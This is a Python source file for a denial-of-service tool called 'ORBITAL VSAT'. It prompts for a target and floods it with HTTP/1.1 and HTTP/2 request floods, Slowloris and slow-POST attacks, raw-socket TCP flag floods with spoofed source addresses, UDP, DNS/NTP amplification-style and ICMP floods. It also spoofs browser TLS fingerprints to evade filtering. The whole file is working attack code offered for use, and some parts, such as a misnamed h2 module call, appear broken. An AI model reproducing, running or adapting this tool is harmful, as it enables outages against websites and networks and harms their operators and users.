#!/usr/bin/env python

# ORBITAL VOLUMETRIC SHOCKWAVES ARTILLERY a.k.a ORBITAL VSAT
# Author: XTM26
# GitHub: @XTM26 | https://github.com/XTM26
# Release: November 25th, 2025
# Version: VSAT.2.0
# All Layers [ 3 | 4 | 7 ] + HTTP/2 + HTTP/3 + JA3 Spoof + Multi Methods
# Note: For some features is under development. i will realease it ASAP

try:
    import multiprocessing as mp
    import os
    import random
    import socket
    import ssl
    import struct
    import sys
    import threading
    import time
    from cores.stdio import Clear, StrObject
    from cores.logo import Banner, Helper
    from cores.color import Color
    from concurrent.futures import ThreadPoolExecutor
    from time import sleep
    from urllib.parse import urlencode, urlparse

    # HTTP/2
    try:
        import h2.config
        import h2.connection

        HasH2 = True
    except ImportError:
        HasH2 = False

    # HTTP/3
    try:
        import asyncio
        from aioquic.asyncio.client import connect
        from aioquic.h3.connection import H3_ALPN
        from aioquic.quic.configuration import QuicConfiguration

        HasH3 = True
    except ImportError:
        HasH3 = False

except ModuleNotFoundError as e:
    print(
        f"{Color.orange}[{Color.red} WARNING {Color.orange}]: {Color.red} MODULE NOT INSTALLED {Color.darkgreen} {e} {Color.reset}"
    )
    sys.exit(1)

# JA3 Profiles
JA3Profiles = {
    "chrome": {
        "ciphers": [
            0x1301,
            0x1302,
            0x1303,
            0xC02B,
            0xC02F,
            0xC02C,
            0xC030,
            0xCCA9,
            0xCCA8,
        ],
        "curves": [29, 23, 24],
    },
    "firefox": {
        "ciphers": [
            0x1301,
            0x1302,
            0x1303,
            0xC02B,
            0xC02F,
            0xCCA9,
            0xCCA8,
            0xC02C,
            0xC030,
        ],
        "curves": [29, 23, 24, 25],
    },
    "safari": {
        "ciphers": [
            0x1301,
            0x1302,
            0x1303,
            0xC02C,
            0xC02B,
            0xC030,
            0xC02F,
            0xCCA9,
            0xCCA8,
        ],
        "curves": [29, 23, 24],
    },
}


class OrbitalVSAT:
    def __init__(self):
        self.Target = None
        self.Method = "POST"
        self.Threads = 500
        self.Duration = 60
        self.Protocol = "h1"
        self.ClusterMode = False
        self.Processes = mp.cpu_count()
        self.JAProfiles = "chrome"
        self.Running = mp.Value("i", 0)
        self.RequestsCount = mp.Value("i", 0)
        self.BytesSent = mp.Value("i", 0)
        self.StatsLock = mp.Lock()
        self.DefaultUA = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/140.0.0.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/140.0.0.0",
        ]

    def DocLoader(self, Filename, Default):
        if os.path.exists(Filename):
            try:
                with open(Filename, "r") as f:
                    return [
                        Line.strip()
                        for Line in f
                        if Line.strip() and not Line.startswith("#")
                    ] or Default
            except Exception:
                pass
        return Default

    def RandomString(self, length=10):
        return "".join(
            random.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(length)
        )

    def RandomIP(self):
        return f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

    def Setup(self):
        if not self.Target.startswith(("http://", "https://")):
            self.Target = "https://" + self.Target
        parsed = urlparse(self.Target)
        self.Scheme = parsed.scheme
        self.Host = parsed.hostname
        self.path = parsed.path or "/"
        self.Port = parsed.port or (443 if self.Scheme == "https" else 80)
        if "UDP" in self.Method.upper():
            self.Port = 53
        if "NTP" in self.Method.upper():
            self.Port = 123
        try:
            self.IP = socket.gethostbyname(self.Host)
        except Exception:
            StrObject.Typewriter(
                f"{Color.orange}[{Color.red} ERROR {Color.orange}]: {Color.white} CANNOT RESOLVE: {Color.red} {self.Host} {Color.reset}"
            )
            raise
        self.useragents = self.DocLoader("UA.txt", self.DefaultUA)
        StrObject.Typewriter(
            f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} TARGET: {Color.white} {self.Target} {Color.reset}"
        )
        StrObject.Typewriter(
            f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} IP ADDRESS: {Color.white} {self.IP}:{self.Port} {Color.reset}"
        )
        StrObject.Typewriter(
            f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} METHODS: {Color.white} {self.Method} {Color.reset}"
        )
        StrObject.Typewriter(
            f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} PROTOCOL: {Color.white} {self.Protocol.upper()} {Color.reset}"
        )
        StrObject.Typewriter(
            f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} JA3 Fingerprint: {Color.white} {self.JAProfiles} {Color.reset}"
        )

        if self.ClusterMode:
            StrObject.Typewriter(
                f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} CLUSTER: {Color.white} {self.Processes} {Color.cyan} CORES x: {Color.white} {self.Processes * self.Threads} {Color.darkgreen} THREADS. {Color.reset}"
            )

    def GetCipherNames(self, CipherCodes):
        ChiperList = {
            0x1301: "TLS_AES_128_GCM_SHA256",
            0x1302: "TLS_AES_256_GCM_SHA384",
            0x1303: "TLS_CHACHA20_POLY1305_SHA256",
            0xC02B: "ECDHE-ECDSA-AES128-GCM-SHA256",
            0xC02F: "ECDHE-RSA-AES128-GCM-SHA256",
            0xC02C: "ECDHE-ECDSA-AES256-GCM-SHA384",
            0xC030: "ECDHE-RSA-AES256-GCM-SHA384",
            0xCCA9: "ECDHE-ECDSA-CHACHA20-POLY1305",
            0xCCA8: "ECDHE-RSA-CHACHA20-POLY1305",
        }
        return [ChiperList.get(c, "") for c in CipherCodes[:8] if c in ChiperList] or [
            "ECDHE+AESGCM"
        ]

    def CreateJa3Socket(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(3)
            sock.connect((self.IP, self.Port))
            if self.Scheme == "https":
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
                profile = JA3Profiles[self.JAProfiles]
                CipherNames = self.GetCipherNames(profile["ciphers"])
                try:
                    context.set_ciphers(":".join(CipherNames))
                except Exception:
                    context.set_ciphers("ECDHE+AESGCM:!aNULL")
                if self.Protocol == "h2":
                    context.set_alpn_protocols(["h2", "http/1.1"])
                elif self.Protocol == "h3":
                    context.set_alpn_protocols(["h3"])
                else:
                    context.set_alpn_protocols(["http/1.1"])
                sock = context.wrap_socket(sock, server_hostname=self.Host)
            return sock
        except Exception:
            return None

    # LAYER 7 HTTP METHODS

    def HTTPExecutor(self, ExecutorID):
        """HTTP/1.1 Worker For All HTTP Methods"""
        LocalCount = 0
        localBytes = 0
        httpMethods = {
            "GET": "GET",
            "POST": "POST",
            "PUT": "PUT",
            "HEAD": "HEAD",
            "DELETE": "DELETE",
            "PATCH": "PATCH",
            "OPTIONS": "OPTIONS",
            "CONNECT": "CONNECT",
            "TRACE": "TRACE",
        }
        while self.Running.value:
            sock = None
            try:
                sock = self.CreateJa3Socket()
                if not sock:
                    continue
                for _ in range(500):
                    if not self.Running.value:
                        break
                    try:
                        if self.Method == "RANDOM":
                            httpMethods = random.choice(list(httpMethods.values()))
                        else:
                            httpMethods = httpMethods.get(self.Method, "GET")
                        ua = random.choice(self.useragents)
                        path = f"{self.path}?_={int(time.time() * 1000000)}&{self.RandomString(8)}"
                        request = f"{httpMethods} {path} HTTP/1.1\r\n"
                        request += f"Host: {self.Host}\r\n"
                        request += f"User-Agent: {ua}\r\n"
                        request += "Accept: */*\r\n"
                        request += f"X-Forwarded-For: {self.RandomIP()}\r\n"
                        request += "Connection: keep-alive\r\n"
                        if httpMethods in ["POST", "PUT", "PATCH"]:
                            body = ("X" * 65536).encode()
                            request += f"Content-Length: {len(body)}\r\n\r\n"
                            payload = request.encode() + body
                        else:
                            request += "\r\n"
                            payload = request.encode()
                        sock.sendall(payload)
                        LocalCount += 1
                        localBytes += len(payload)
                        try:
                            sock.settimeout(0.0001)
                            sock.recv(16384)
                        except Exception:
                            pass
                    except Exception:
                        break
                if LocalCount > 0:
                    with self.StatsLock:
                        self.RequestsCount.value += LocalCount
                        self.BytesSent.value += localBytes
                    LocalCount = 0
                    localBytes = 0
            except Exception:
                pass
            finally:
                if sock:
                    try:
                        sock.close()
                    except Exception:
                        pass

    def SlowlorisExecutor(self, ExecutorID):
        """Slowloris Attack"""
        Connections = []
        for _ in range(200):
            try:
                sock = self.CreateJa3Socket()
                if sock:
                    sock.sendall(
                        f"GET {self.path} HTTP/1.1\r\nHost: {self.Host}\r\n".encode()
                    )
                    Connections.append(sock)
            except Exception:
                pass
        while self.Running.value:
            for sock in Connections[:]:
                try:
                    sock.sendall(
                        f"X-{self.RandomString(5)}: {self.RandomString(10)}\r\n".encode()
                    )
                    with self.StatsLock:
                        self.RequestsCount.value += 1
                except Exception:
                    Connections.remove(sock)
            sleep(10)

    def SlowPostExecutor(self, ExecutorID):
        """Slow POST Attack"""
        Connections = []
        for _ in range(100):
            try:
                sock = self.CreateJa3Socket()
                if sock:
                    req = f"POST {self.path} HTTP/1.1\r\nHost: {self.Host}\r\nContent-Length: 999999999\r\n\r\n"
                    sock.sendall(req.encode())
                    Connections.append(sock)
            except Exception:
                pass
        while self.Running.value:
            for sock in Connections[:]:
                try:
                    sock.sendall(self.RandomString(1).encode())
                except Exception:
                    Connections.remove(sock)
            sleep(1)

    # HTTP/2 METHODS

    def H2Executor(self, ExecutorID):
        """HTTP/2 Worker With Priority"""
        if not HasH2:
            return
        LocalCount = 0
        localBytes = 0
        while self.Running.value:
            sock = None
            h2Connection = None
            try:
                sock = self.CreateJa3Socket()
                if not sock:
                    continue
                if self.Scheme == "https" and sock.selected_alpn_protocol() != "h2":
                    sock.close()
                    continue
                config = h2.cores.H2Configuration(client_side=True)
                h2Connection = h2.connection.H2Connection(config=config)
                h2Connection.initiate_connection()
                h2Connection.increment_flow_control_window(15663105)
                sock.sendall(h2Connection.data_to_send())
                for StreamId in range(1, 513, 2):
                    if not self.Running.value:
                        break
                    try:
                        h2Connection.prioritize(StreamId, weight=random.randint(1, 256))
                        headers = [
                            (":method", "POST" if "POST" in self.Method else "GET"),
                            (":scheme", self.Scheme),
                            (":authority", self.Host),
                            (
                                ":path",
                                f"{self.path}?s={StreamId}&_{int(time.time() * 1000000)}",
                            ),
                            ("user-agent", random.choice(self.useragents)),
                        ]
                        h2Connection.send_headers(StreamId, headers)
                        if "POST" in self.Method:
                            body = os.urandom(65536)
                            h2Connection.send_data(StreamId, body)
                            localBytes += len(body)
                        h2Connection.end_stream(StreamId)
                        if StreamId % 32 == 1:
                            data = h2Connection.data_to_send()
                            if data:
                                sock.sendall(data)
                                localBytes += len(data)
                        LocalCount += 1
                    except Exception:
                        break
                if LocalCount > 0:
                    with self.StatsLock:
                        self.RequestsCount.value += LocalCount
                        self.BytesSent.value += localBytes
                    LocalCount = 0
                    localBytes = 0
            except Exception:
                pass
            finally:
                if h2Connection:
                    try:
                        h2Connection.close_connection()
                    except Exception:
                        pass
                if sock:
                    try:
                        sock.close()
                    except Exception:
                        pass

    def H2PingExecutor(self, ExecutorID):
        """HTTP/2 PING Flood"""
        if not HasH2:
            return

        while self.Running.value:
            sock = None
            h2Connection = None
            try:
                sock = self.CreateJa3Socket()
                if not sock:
                    continue
                config = h2.cores.H2Configuration(client_side=True)
                h2Connection = h2.connection.H2Connection(config=config)
                h2Connection.initiate_connection()
                sock.sendall(h2Connection.data_to_send())
                for _ in range(1000):
                    if not self.Running.value:
                        break
                    try:
                        h2Connection.ping(os.urandom(8))
                        data = h2Connection.data_to_send()
                        if data:
                            sock.sendall(data)
                        with self.StatsLock:
                            self.RequestsCount.value += 1
                    except Exception:
                        break
            except Exception:
                pass

    # LAYER 4 TCP METHODS

    def TCPExecutor(self, ExecutorID):
        """TCP Connection Flood"""
        LocalCount = 0
        while self.Running.value:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.IP, self.Port))
                sock.sendall(os.urandom(2048))
                LocalCount += 1
                if LocalCount >= 100:
                    with self.StatsLock:
                        self.RequestsCount.value += LocalCount
                    LocalCount = 0
                sock.close()
            except Exception:
                pass

    def SYNExecutor(self, ExecutorID):
        """SYN Flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except PermissionError:
            return
        while self.Running.value:
            try:
                SourceIP = self.RandomIP()
                IPHeader = struct.pack(
                    "!BBHHHBBH4s4s",
                    69,
                    0,
                    40,
                    random.randint(1, 65535),
                    0,
                    64,
                    socket.IPPROTO_TCP,
                    0,
                    socket.inet_aton(SourceIP),
                    socket.inet_aton(self.IP),
                )
                TCPHeader = struct.pack(
                    "!HHLLBBHHH",
                    random.randint(1024, 65535),
                    self.Port,
                    0,
                    0,
                    80,
                    2,
                    8192,
                    0,
                    0,
                )
                sock.sendto(IPHeader + TCPHeader, (self.IP, 0))
                with self.StatsLock:
                    self.RequestsCount.value += 1
            except Exception:
                pass

    def ACKExecutor(self, ExecutorID):
        """ACK Flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except PermissionError:
            return
        while self.Running.value:
            try:
                SourceIP = self.RandomIP()
                IPHeader = struct.pack(
                    "!BBHHHBBH4s4s",
                    69,
                    0,
                    40,
                    random.randint(1, 65535),
                    0,
                    64,
                    socket.IPPROTO_TCP,
                    0,
                    socket.inet_aton(SourceIP),
                    socket.inet_aton(self.IP),
                )
                TCPHeader = struct.pack(
                    "!HHLLBBHHH",
                    random.randint(1024, 65535),
                    self.Port,
                    0,
                    0,
                    80,
                    16,
                    8192,
                    0,
                    0,
                )
                sock.sendto(IPHeader + TCPHeader, (self.IP, 0))

                with self.StatsLock:
                    self.RequestsCount.value += 1
            except Exception:
                pass

    def RSTExecutor(self, ExecutorID):
        """RST Flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except PermissionError:
            return
        while self.Running.value:
            try:
                SourceIP = self.RandomIP()
                IPHeader = struct.pack(
                    "!BBHHHBBH4s4s",
                    69,
                    0,
                    40,
                    random.randint(1, 65535),
                    0,
                    64,
                    socket.IPPROTO_TCP,
                    0,
                    socket.inet_aton(SourceIP),
                    socket.inet_aton(self.IP),
                )
                TCPHeader = struct.pack(
                    "!HHLLBBHHH",
                    random.randint(1024, 65535),
                    self.Port,
                    0,
                    0,
                    80,
                    4,
                    8192,
                    0,
                    0,
                )
                sock.sendto(IPHeader + TCPHeader, (self.IP, 0))
                with self.StatsLock:
                    self.RequestsCount.value += 1
            except Exception:
                pass

    def FINExecutor(self, ExecutorID):
        """FIN Flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except PermissionError:
            return
        while self.Running.value:
            try:
                SourceIP = self.RandomIP()
                IPHeader = struct.pack(
                    "!BBHHHBBH4s4s",
                    69,
                    0,
                    40,
                    random.randint(1, 65535),
                    0,
                    64,
                    socket.IPPROTO_TCP,
                    0,
                    socket.inet_aton(SourceIP),
                    socket.inet_aton(self.IP),
                )
                TCPHeader = struct.pack(
                    "!HHLLBBHHH",
                    random.randint(1024, 65535),
                    self.Port,
                    0,
                    0,
                    80,
                    1,
                    8192,
                    0,
                    0,
                )
                sock.sendto(IPHeader + TCPHeader, (self.IP, 0))
                with self.StatsLock:
                    self.RequestsCount.value += 1
            except Exception:
                pass

    def XMASExecutor(self, ExecutorID):
        """XMAS Flood (FIN+PSH+URG)"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except PermissionError:
            return
        while self.Running.value:
            try:
                SourceIP = self.RandomIP()
                IPHeader = struct.pack(
                    "!BBHHHBBH4s4s",
                    69,
                    0,
                    40,
                    random.randint(1, 65535),
                    0,
                    64,
                    socket.IPPROTO_TCP,
                    0,
                    socket.inet_aton(SourceIP),
                    socket.inet_aton(self.IP),
                )
                TCPHeader = struct.pack(
                    "!HHLLBBHHH",
                    random.randint(1024, 65535),
                    self.Port,
                    0,
                    0,
                    80,
                    41,
                    8192,
                    0,
                    0,
                )
                sock.sendto(IPHeader + TCPHeader, (self.IP, 0))
                with self.StatsLock:
                    self.RequestsCount.value += 1
            except Exception:
                pass

    # LAYER 4 UDP METHODS

    def UDPExecutor(self, ExecutorID):
        """UDP Flood"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        LocalCount = 0
        localBytes = 0
        while self.Running.value:
            try:
                data = os.urandom(65507)
                sock.sendto(data, (self.IP, self.Port))
                LocalCount += 1
                localBytes += len(data)
                if LocalCount >= 500:
                    with self.StatsLock:
                        self.RequestsCount.value += LocalCount
                        self.BytesSent.value += localBytes
                    LocalCount = 0
                    localBytes = 0
            except Exception:
                pass

    def UDPFragExecutor(self, ExecutorID):
        """UDP Fragmentation Flood"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        while self.Running.value:
            try:
                for i in range(10):
                    frag = os.urandom(8192)
                    sock.sendto(frag, (self.IP, self.Port))
                with self.StatsLock:
                    self.RequestsCount.value += 10
            except Exception:
                pass

    def DNSAmpExecutor(self, ExecutorID):
        """DNS Amplification"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        DNSQuery = b"\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
        DNSQuery += b"\x03www\x06google\x03com\x00\x00\xff\x00\x01"
        while self.Running.value:
            try:
                sock.sendto(DNSQuery, (self.IP, self.Port))
                with self.StatsLock:
                    self.RequestsCount.value += 1
            except Exception:
                pass

    def NTPAmpExecutor(self, ExecutorID):
        """NTP Amplification"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        NTPQuery = b"\x17\x00\x03\x2a" + b"\x00" * 4
        while self.Running.value:
            try:
                sock.sendto(NTPQuery, (self.IP, self.Port))
                with self.StatsLock:
                    self.RequestsCount.value += 1
            except Exception:
                pass

    # LAYER 3 ICMP METHODS

    def ICMPExecutor(self, ExecutorID):
        """ICMP Flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except PermissionError:
            return
        while self.Running.value:
            try:
                packetId = random.randint(1, 65535)
                header = struct.pack("!BBHHH", 8, 0, 0, packetId, 1)
                data = os.urandom(2048)
                checksum = self.CalculateChecksum(header + data)
                header = struct.pack(
                    "!BBHHH", 8, 0, socket.htons(checksum), packetId, 1
                )
                sock.sendto(header + data, (self.IP, 0))
                with self.StatsLock:
                    self.RequestsCount.value += 1
                    self.BytesSent.value += len(header + data)
            except Exception:
                pass

    def CalculateChecksum(self, data):
        s = 0
        for i in range(0, len(data), 2):
            if i + 1 < len(data):
                s += (data[i] << 8) + data[i + 1]
            else:
                s += data[i] << 8
        s = (s >> 16) + (s & 0xFFFF)
        s += s >> 16
        return ~s & 0xFFFF

    # CLUSTER & Stats

    def ClusterProcess(self, ProcessID):
        """Cluster Process"""
        MethodOptions = {
            "GET": self.HTTPExecutor,
            "POST": self.HTTPExecutor,
            "PUT": self.HTTPExecutor,
            "HEAD": self.HTTPExecutor,
            "DELETE": self.HTTPExecutor,
            "PATCH": self.HTTPExecutor,
            "OPTIONS": self.HTTPExecutor,
            "CONNECT": self.HTTPExecutor,
            "TRACE": self.HTTPExecutor,
            "RANDOM": self.HTTPExecutor,
            "SLOWLORIS": self.SlowlorisExecutor,
            "SLOW-POST": self.SlowPostExecutor,
            "H2-GET": self.H2Executor,
            "H2-POST": self.H2Executor,
            "H2-PING": self.H2PingExecutor,
            "TCP": self.TCPExecutor,
            "SYN": self.SYNExecutor,
            "ACK": self.ACKExecutor,
            "RST": self.RSTExecutor,
            "FIN": self.FINExecutor,
            "XMAS": self.XMASExecutor,
            "UDP": self.UDPExecutor,
            "UDP-FRAG": self.UDPFragExecutor,
            "DNS-AMP": self.DNSAmpExecutor,
            "NTP-AMP": self.NTPAmpExecutor,
            "ICMP": self.ICMPExecutor,
        }
        ThreadsExecutor = MethodOptions.get(self.Method, self.HTTPExecutor)
        with ThreadPoolExecutor(max_workers=self.Threads) as executor:
            futures = [executor.submit(ThreadsExecutor, i) for i in range(self.Threads)]
            for f in futures:
                f.result()
            while self.Running.value:
                sleep(1)

    def StatsExecutor(self):
        """Stats Display"""
        LastCount = 0
        LastBytes = 0
        while self.Running.value:
            sleep(1)
            with self.StatsLock:
                count = self.RequestsCount.value
                totalBytes = self.BytesSent.value
            diff = count - LastCount
            bdiff = totalBytes - LastBytes
            rps = diff
            mbps = (bdiff * 8) / (1024 * 1024)
            LastCount = count
            LastBytes = totalBytes
            print(
                f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} REQUESTS: {Color.green}[{Color.red} {count:,} {Color.green}] {Color.white} TARGET: {Color.darkgreen} {self.Host} {Color.white} METHODS: {Color.darkgreen} {self.Method} {Color.white} IP: {Color.darkgreen} {self.IP}:{self.Port} {Color.white} RPS: {Color.darkgreen} {rps:,} {Color.white} BW: {Color.darkgreen} {mbps:.1f} Mbps {Color.reset}"
            )

    def Start(self):
        try:
            self.Setup()
        except Exception:
            return
        self.Running.value = 1
        StrObject.Typewriter(f"\n{Color.darkgreen} {'=' * 100}")
        StrObject.Typewriter(
            f"{Color.cyan}[{Color.red} ORBITAL VSAT {Color.cyan}] {Color.cyan} STARTING ATTACK {Color.orange} {self.Method} {Color.reset}"
        )
        StrObject.Typewriter(f"{Color.darkgreen} {'=' * 100}\n")
        StatsThread = threading.Thread(target=self.StatsExecutor, daemon=True)
        StatsThread.start()
        if self.ClusterMode:
            processes = []
            for i in range(self.Processes):
                p = mp.Process(target=self.ClusterProcess, args=(i,))
                p.start()
                processes.append(p)
                sleep(0.02)
            StrObject.Typewriter(
                f"{Color.cyan}[{Color.red} ORBITAL VSAT {Color.cyan}] {Color.cyan} CLUSTER: {Color.orange} {self.Processes * self.Threads} {Color.orange} THREADS ACTIVE!\n {Color.reset}"
            )
            try:
                sleep(self.Duration)
            except KeyboardInterrupt:
                pass
            self.Running.value = 0
            for p in processes:
                p.join(timeout=2)
                if p.is_alive():
                    p.terminate()
        else:
            MethodOptions = {
                "GET": self.HTTPExecutor,
                "POST": self.HTTPExecutor,
                "PUT": self.HTTPExecutor,
                "HEAD": self.HTTPExecutor,
                "DELETE": self.HTTPExecutor,
                "PATCH": self.HTTPExecutor,
                "OPTIONS": self.HTTPExecutor,
                "CONNECT": self.HTTPExecutor,
                "TRACE": self.HTTPExecutor,
                "RANDOM": self.HTTPExecutor,
                "SLOWLORIS": self.SlowlorisExecutor,
                "SLOW-POST": self.SlowPostExecutor,
                "H2-GET": self.H2Executor,
                "H2-POST": self.H2Executor,
                "H2-PING": self.H2PingExecutor,
                "TCP": self.TCPExecutor,
                "SYN": self.SYNExecutor,
                "ACK": self.ACKExecutor,
                "RST": self.RSTExecutor,
                "FIN": self.FINExecutor,
                "XMAS": self.XMASExecutor,
                "UDP": self.UDPExecutor,
                "UDP-FRAG": self.UDPFragExecutor,
                "DNS-AMP": self.DNSAmpExecutor,
                "NTP-AMP": self.NTPAmpExecutor,
                "ICMP": self.ICMPExecutor,
            }
            ThreadsExecutor = MethodOptions.get(self.Method, self.HTTPExecutor)
            with ThreadPoolExecutor(max_workers=self.Threads) as executor:
                futures = [
                    executor.submit(ThreadsExecutor, i) for i in range(self.Threads)
                ]
                for f in futures:
                    f.result()

                StrObject.Typewriter(
                    f"{Color.cyan}[{Color.red} ORBITAL VSAT {Color.cyan}] {Color.cyan} RUNNING: {Color.orange} {self.Threads} {Color.orange} THREADS!\n {Color.reset}"
                )
                try:
                    sleep(self.Duration)
                except KeyboardInterrupt:
                    pass
                self.Running.value = 0
        sleep(2)
        with self.StatsLock:
            finalCount = self.RequestsCount.value
            finalBytes = self.BytesSent.value
        StrObject.Typewriter(
            f"{Color.cyan}[{Color.red} ORBITAL VSAT {Color.cyan}] {Color.cyan} FINAL RESULTS {Color.reset}"
        )
        StrObject.Typewriter(f"{Color.darkgreen} {'=' * 100}")
        StrObject.Typewriter(
            f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} TOTAL REQUESTS: {Color.white} {finalCount:,} {Color.reset}"
        )
        StrObject.Typewriter(
            f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} TOTAL SENT: {Color.white} {finalBytes / 1048576:.2f} {Color.cyan} Mb {Color.reset}"
        )
        if self.Duration > 0:
            StrObject.Typewriter(
                f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} AVG RPS: {Color.white} {finalCount / self.Duration:.0f} {Color.reset}"
            )
            StrObject.Typewriter(
                f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} AVG Bandwidth: {Color.white} {(finalBytes * 8) / (self.Duration * 1048576):.2f} {Color.cyan} Mbps {Color.reset}"
            )


def Main():
    Clear()
    Banner()
    try:
        choice = (
            input(
                f"{Color.white}[{Color.orange} INFO {Color.white}] {Color.white}Continue? {Color.darkgreen}Y{Color.white}/{Color.red}n{Color.white}/{Color.cyan}h {Color.orange}"
            )
            .strip()
            .lower()
        )
        if choice == "h":
            Helper()
            input(
                f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} PRESS ENTER TO CONTINUE .... {Color.reset}"
            )
        elif choice == "n":
            sys.exit(0)
        StrObject.Typewriter(f"{Color.red} ORBITAL CONFIGURATION{Color.reset}")
        VSAT = OrbitalVSAT()
        VSAT.Target = input(
            f"{Color.white}[{Color.orange} SET {Color.white}] {Color.darkgreen} TARGET {Color.white} > {Color.cyan}"
        ).strip()
        if not VSAT.Target:
            return
        VSAT.Method = (
            input(
                f"{Color.white}[{Color.orange} SET {Color.white}] {Color.darkgreen} METHODS {Color.white} > {Color.cyan}"
            )
            .strip()
            .upper()
        )
        if not VSAT.Method:
            VSAT.Method = "POST"
        if VSAT.Method in [
            "GET",
            "POST",
            "PUT",
            "HEAD",
            "DELETE",
            "PATCH",
            "OPTIONS",
            "CONNECT",
            "TRACE",
            "RANDOM",
            "H2-GET",
            "H2-POST",
        ]:
            proto = (
                input(
                    f"{Color.white}[{Color.orange} SET {Color.white}] {Color.darkgreen} PROTOCOL {Color.white} [ h1 | h2 | Default h1 ] > {Color.cyan}"
                )
                .strip()
                .lower()
            )
            VSAT.Protocol = proto if proto in ["h1", "h2", "h3"] else "h1"
            ja3 = (
                input(
                    f"{Color.white}[{Color.orange} SET {Color.white}] {Color.darkgreen} JA3 PROFILE {Color.white} [ chrome | firefox | safari ] > {Color.cyan}"
                )
                .strip()
                .lower()
            )
            VSAT.JAProfiles = (
                ja3 if ja3 in ["chrome", "firefox", "safari"] else "chrome"
            )
        threads = input(
            f"{Color.white}[{Color.orange} SET {Color.white}] {Color.darkgreen} THREADS {Color.white} [ Default 500 ] > {Color.cyan}"
        ).strip()
        VSAT.Threads = int(threads) if threads else 500
        duration = input(
            f"{Color.white}[{Color.orange} SET {Color.white}] {Color.darkgreen} DURATION {Color.white} [ seconds, Default 60 ] > {Color.cyan}"
        ).strip()
        VSAT.Duration = int(duration) if duration else 60
        cluster = (
            input(
                f"{Color.white}[{Color.orange} SET {Color.white}] {Color.darkgreen} CLUSTER MODE {Color.white} [ Y/n ] > {Color.cyan}"
            )
            .strip()
            .lower()
        )
        VSAT.ClusterMode = cluster == "y"
        VSAT.Start()
    except KeyboardInterrupt:
        StrObject.Typewriter(
            f"{Color.red}[{Color.orange} INFO {Color.red}] {Color.orange} KEYBOARD INTERRUPTED."
        )
        sys.exit(0)
    except Exception as e:
        StrObject.Typewriter(
            f"{Color.orange}[{Color.red} ERROR {Color.orange}]: {Color.red} {e} {Color.reset}"
        )


if __name__ == "__main__":
    Main()
